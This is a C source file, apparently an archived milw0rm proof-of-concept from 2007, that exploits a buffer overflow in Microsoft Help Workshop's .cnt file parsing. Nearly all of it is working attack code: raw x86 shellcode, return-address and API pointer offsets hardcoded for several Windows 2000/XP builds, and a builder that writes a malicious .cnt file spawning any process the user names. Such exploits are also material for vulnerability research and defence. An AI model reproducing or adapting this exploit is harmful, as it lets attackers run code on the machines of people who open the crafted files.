//*****************
//
//  PoC exploit for .cnt files buffer overflow vulnerability in 
//  Microsoft Help Workshop v4.03.0002
//  The tool is standard component of MS Visual Studio v6.0, 2003 (.NET)
//
//  vulnerability found / exploit built by porkythepig
//
//*****************

#include "stdio.h"
#include "stdlib.h"
#include "string.h"
#include "memory.h"

#define STR01 "0 Microsoft Help Workshop PoC exploit by porkythepig    "
#define DEF_SPAWNED_PROCESS "notepad.exe"
#define EXPL_SIZE 619
#define PROC_NAM_SIZ 66
#define RET_OFFSET 0x210
#define PROC_NAME_OFFSET 0x228
#define BACK_SEQ_OFFSET 0x218
#define EXPRO_OFFSET 0xbf
#define GETSTAR_OFFSET 0x4a
#define CREPRO_OFFSET 0xb5
#define GETWINDIR_OFFSET 0x65

typedef struct
{
	unsigned int extPro;
	unsigned int getStarInf;
	unsigned int crePro;
	unsigned int getWinDir;
	unsigned int jmpEspPtr;
}ApiPtrs;

ApiPtrs osApiPtrs[5]=
{
	0x793f69da,0x793f6b7a,0x793f5010,0x793f2d23,0x7cfdbd1b, 
	0x7c4ee01a,0x7c4f49df,0x7c4fc0a0,0x7c4e9cFF,0x784452e4, 
	0x7c5969da,0x7c596b7a,0x7c595010,0x7c592d23,0x7d0812e4, 
	0x7c81cdda,0x7c801eee,0x7c802367,0x7c821363,0x7cc58fd8, 
	0x77e75cb5,0x77e6177a,0x77e61bb8,0x77e705b0,0x775e6247  
};

unsigned char shlCode[]=
{
	0x66,0x83,0xc4,0x10,0x8b,0xc4,0x66,0x81,
	0xec,0x10,0x21,0x50,0x66,0x2d,0x11,0x11,
	0x50,0xb8,0x7a,0x6b,0x3f,0x79,0xff,0xd0,
	0x58,0x50,0x80,0x38,0x20,0x74,0x49,0x5b,
	0x53,0x33,0xc0,0xb0,0xff,0x50,0x66,0x81,
	0xeb,0x11,0x05,0x53,0xb8,0x23,0x2d,0x3f,
	0x79,0x3c,0xff,0x75,0x02,0x32,0xc0,0xff,
	0xd0,0x58,0x50,0x66,0x2d,0x11,0x05,0x32,
	0xdb,0x38,0x18,0x74,0x03,0x40,0xeb,0xf9,
	0x5b,0x53,0x32,0xd2,0xb1,0x5c,0x88,0x08,
	0x40,0x38,0x13,0x74,0x08,0x8a,0x0b,0x88,
	0x08,0x43,0x40,0xeb,0xf4,0x32,0xd2,0x88,
	0x10,0x58,0x50,0x66,0x2d,0x11,0x05,0x48,
	0x40,0x8b,0xd0,0x58,0x50,0x66,0x2d,0x11,
	0x11,0x50,0x33,0xc9,0x51,0x51,0x51,0x51,
	0x51,0x51,0x51,0x52,0xb8,0x10,0x50,0x3f,
	0x79,0xff,0xd0,0x33,0xc0,0x50,0xb8,0xda,
	0x69,0x3f,0x79,0xff,0xd0
};

unsigned char backSeq[]=
{ 
	0xe9,0x1b,0xfe,0xff,0xff 
};

char buf0[EXPL_SIZE];
char spawnProcess[PROC_NAM_SIZ];
char *outName;
int osId;
int defProc;

void CompileBuffer()
{
	int ptr=0;

	memset(buf0,'1',EXPL_SIZE);
	ptr+=sprintf(buf0,"%s",STR01);
	memcpy(buf0+ptr,shlCode,sizeof(shlCode));
	memcpy(buf0+BACK_SEQ_OFFSET,backSeq,sizeof(backSeq));

	*((unsigned int*)(buf0+EXPRO_OFFSET))=osApiPtrs[osId].extPro;
	*((unsigned int*)(buf0+GETSTAR_OFFSET))=osApiPtrs[osId].getStarInf;
	*((unsigned int*)(buf0+CREPRO_OFFSET))=osApiPtrs[osId].crePro;
	*((unsigned int*)(buf0+GETWINDIR_OFFSET))=osApiPtrs[osId].getWinDir;
	*((unsigned int*)(buf0+RET_OFFSET))=osApiPtrs[osId].jmpEspPtr;

	ptr=PROC_NAME_OFFSET;
	if(!defProc)
	{
		buf0[ptr]=32;
		ptr++;
	}
	sprintf(buf0+ptr,"%s",spawnProcess);

	printf("Exploit buffer compiled\n");
}

void WriteBuffer()
{
	FILE *o;

	o=fopen(outName,"wb");
	if(o==NULL)
	{
		printf("Cannot open file for writing\n");
		exit(0);
	}
	
	fwrite(buf0,EXPL_SIZE,1,o);
	fclose(o);

	printf("Output .cnt file [ %s ] built successfully\n",outName);
}

void ProcessInput(int argc, char* argv[])
{
	printf("\nMicrosoft Help Workshop 4.03.0002 .cnt files exploit\n");
	printf("Vulnerability found & exploit built by porkythepig\n");
	
	if(argc<3)
	{
		printf("Syntax: exploit.exe os outName [spawnProc]\n");
		printf("[ os ]        host OS, possible choices:\n");
		printf("                0   Windows 2000 SP4 [Polish] updates on 11.01.2007\n"); 
		printf("                1   Windows 2000 SP4 [English]\n"); 
		printf("                2   Windows 2000 SP4 [English] updates on 11.01.2007\n");
		printf("                3   Windows XP Pro SP2 [English] updates on 11.01.2007\n");
		printf("                4   Windows XP Pro [English]\n");
		printf("[ outName ]   output .cnt exploit file name\n");
		printf("[ spawnProc ] *optional* full path to the process to be spawned by\n");
		printf("               the exploit (if none specified default will be notepad.exe)\n");
		exit(0);
	}

	osId=atol(argv[1]);
	if((osId<0)||(osId>4))
	{
		exit(0);
	}

	outName=argv[2];

	if(argc>3)
	{
		if(strlen(argv[3])>=PROC_NAM_SIZ) 
		{
			exit(0);
		}
		strcpy(spawnProcess,argv[3]);
		defProc=0;
	}
	else
	{
		strcpy(spawnProcess,DEF_SPAWNED_PROCESS);
		defProc=1;
	}
}

int main(int argc, char* argv[])
{

	ProcessInput(argc,argv);
	CompileBuffer();
	WriteBuffer();

	return 0;
}

// milw0rm.com [2007-01-17]